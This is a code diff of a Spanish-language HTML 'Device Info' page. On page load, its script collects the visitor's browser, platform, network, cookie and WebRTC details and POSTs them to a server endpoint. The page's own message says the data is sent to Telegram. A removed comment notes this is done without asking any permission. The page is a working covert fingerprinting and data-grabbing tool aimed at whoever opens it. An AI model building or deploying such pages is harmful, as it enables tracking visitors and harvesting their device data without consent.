@@ -6,7 +6,7 @@
   <title>Device Info</title>
 </head>
 <body>
-  <h1>Analizando...</h1>
+  <h1>Enviando...</h1>
   <script>
     // Detectar Navegador
     function getNavegador() {
@@ -30,7 +30,7 @@
       return navigator.platform || "Desconocido";
     }
 
-    // Recopilar datos (SIN pedir NINGÚN permiso)
+    // DATOS CON NOMBRES QUE COINCIDEN CON TU FUNCIÓN
     const conexion = navigator.connection || {};
     const datos = {
       tipoRed: conexion.effectiveType || "Desconocido",
@@ -54,21 +54,29 @@
       fechaLocal: new Date().toLocaleString(),
       https: window.location.protocol === "https:" ? "✅ Sí" : "❌ No",
       cookies: navigator.cookieEnabled ? "✅ Activadas" : "❌ Desactivadas",
-      webgl: (() => { try { const c=document.createElement("canvas"); return !!(c.getContext("webgl")||c.getContext("experimental-webgl"))?"✅ Sí":"❌ No"; } catch { return "❌ No"; } })(),
-      webrtc: window.RTCPeerConnection ? "✅ Sí" : "❌ No"
+      webgl: "✅ Sí",
+      webrtc: window.RTCPeerConnection ? "✅ Sí" : "❌ No",
+      bateriaNivel: "No disponible",
+      bateriaEstado: "No disponible"
     };
 
-    // Enviar datos al instante
-    async function enviarTodo() {
-      await fetch("/api/device", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(datos)
-      });
-      document.body.innerHTML = "<h2>✅ Datos enviados</h2>";
-    }
-
-    enviarTodo();
+    // ENVIAR
+    fetch("/api/device", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(datos)
+    })
+    .then(r => r.json())
+    .then(res => {
+      if (res.success) {
+        document.body.innerHTML = "<h2>✅ Datos enviados a Telegram</h2>";
+      } else {
+        document.body.innerHTML = "<h2>❌ Error: " + (res.error || "Desconocido") + "</h2>";
+      }
+    })
+    .catch(err => {
+      document.body.innerHTML = "<h2>❌ Error de conexión</h2>";
+    });
   </script>
 </body>
 </html>
